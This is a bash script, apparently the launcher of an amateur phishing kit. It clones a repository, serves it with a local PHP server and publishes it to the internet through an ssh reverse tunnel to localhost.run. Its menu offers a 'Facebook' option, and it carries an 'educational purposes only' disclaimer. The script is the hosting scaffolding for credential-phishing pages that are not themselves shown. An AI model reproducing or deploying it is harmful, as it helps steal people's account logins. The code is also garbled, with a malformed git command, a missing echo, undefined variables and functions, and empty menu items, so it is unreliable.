#!/bin/bash

RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

kill_pid() {
	check_PID="php"
        for process in ${check_PID}; do
                if [[ $(pidof ${process}) ]]; then
                        killall ${process} > /dev/null 2>&1
                fi
        done
}

HOST=127.0.0.1

setup_site() {
	{ clear; banner;}
	cd work
        git add . &&  git commit -m . &&  git pull
	echo  "${ORANGE}Choose ${BLUE}Port Numbee ${PURPLE}To Host On: ${RED}"
	read PORT
	echo  "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
	set='php -S "$HOST":"$PORT" &>/dev/null &'
	eval $set
}


host() {
	ssh -R 80:localhost:$PORT nokey@localhost.run #> /home/link 2>&1 &
}


update_repo() {
	git add .
	git commit -m .
	git pull
}


downloads() {
	apt update &&  apt upgrade
        for i in php openssh toilet figlet
         do
          if ! command -v $i; then
           echo "${ORANGE}[${RED}+${ORANGE}]${GREEN} $i package doesn't exist"
  	   echo "${ORANGE}[${RED}+${ORANGE}]${GREEN} installing package $i"
 	   apt install $i -y | pkg install $i -y
	  else
	   "${GREEN}[${ORANGE}+${GREEN}]${CYAN} package $i exist\n${REDBG}* ${ORANGE}continuing script"
	  fi
	 done
}


git_setup() {
	git config --global user.email test@gmail.com
	git config r--global user.name test
}


setup_work() {
	git clone https://github.com/Enthernetcode/work
}

tr() {
  echo "${RED}Existing"
  kill_pid
  exit 0
}
trap tr SIGINT
trap tr SIGTERM
about_it() {
	{ clear; banner;}
        cat <<- EOF
                ${GREEN} Author   ${RED}:  ${ORANGE}ENTHERNET CODE
                ${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Enthernetcode
                ${GREEN} Social   ${RED}:  ${CYAN}UNKOWN
                ${ORANGE} WHATSAPP${BLUE}: ${CYAN}+2347032550017

                ${WHITE} ${REDBG}Warnings-${RESETBG}
                ${CYAN}  This Tool is only for educational purposes
                 ${RED}!${WHITE}${CYAN} users  will be responsible for
                  any misuse of this tool ${RED}!${WHITE}

                ${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
                ${GREEN} Those who inspired me

                ${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit     ${RED}[${WHITE}98${RED}]${ORANGE} HELP

                EOF

        read -p ${RED}[${WHITE}-${RED}]${GREEN} PICK AN OPTION : ${BLUE}
        case $REPLY in
                99)
                        msg_exit;;
                0 | 00)
                        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main page..."
                        { sleep 1; main_menu; };;
                98)
                        { sleep 2; help; };;
                *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; about; };;
        esac
}


help_1() {
	break
}


main_menu() {
        { clear; banner; echo; }
        cat <<- EOF
                ${RED}[${GREEN}<<${RED}]${BLUE} Select A Installation pacakages ${RED}[${GREEN}>>${RED}]${ORANGE}

                ${RED}[${CYAN}01${RED}]${BLUE} install work dependencies
                ${RED}[${CYAN}02${RED}]${BLUE} Facebook
		${RED}[${CYAN}03${RED}]${BLUE}
		${RED}[${CYAN}04${RED}]${BLUE}
		${RED}[${CYAN}05${RED}]${BLUE}
		${RED}[${CYAN}06${RED}]${BLUE}
	EOF
#	esac
}

banner() {
#        cat <<- EOF
printf """
                ${BLUE}
                ${ORANGE}
╭━━━┳━╮╱╭┳━━━━┳╮╱╭┳━━━┳━━━┳━╮╱╭┳━━━┳━━━━╮
┃╭━━┫┃╰╮┃┃╭╮╭╮┃┃╱┃┃╭━━┫╭━╮┃┃╰╮┃┃╭━━┫╭╮╭╮┃${BLUE}
┃╰━━┫╭╮╰╯┣╯┃┃╰┫╰━╯┃╰━━┫╰━╯┃╭╮╰╯┃╰━━╋╯┃┃╰╯${MAGENTA}
┃╭━━┫┃╰╮┃┃╱┃┃╱┃╭━╮┃╭━━┫╭╮╭┫┃╰╮┃┃╭━━╯╱┃┃
┃╰━━┫┃╱┃┃┃╱┃┃╱┃┃╱┃┃╰━━┫┃┃╰┫┃╱┃┃┃╰━━╮╱┃┃${GREEN}
╰━━━┻╯╱╰━╯╱╰╯╱╰╯╱╰┻━━━┻╯╰━┻╯╱╰━┻━━━╯╱╰╯
╭━━━━┳━━━┳━━━┳╮${WHITE}
┃╭╮╭╮┃╭━╮┃╭━╮┃┃
╰╯┃┃╰┫┃╱┃┃┃╱┃┃┃${CYAN}
╱╱┃┃╱┃┃╱┃┃┃╱┃┃┃╱╭╮${MAGENTA}
╱╱┃┃╱┃╰━╯┃╰━╯┃╰━╯┃${BLACK}
╱╱╰╯╱╰━━━┻━━━┻━━━╯${WHITE} ${GREEN}-------->(Tool created by Enthernet)<-------- ${WHITE}
#        EOF
"""
}

#downloads
#git_setup
#main_menu
#about_it
setup_site
host
#help_1
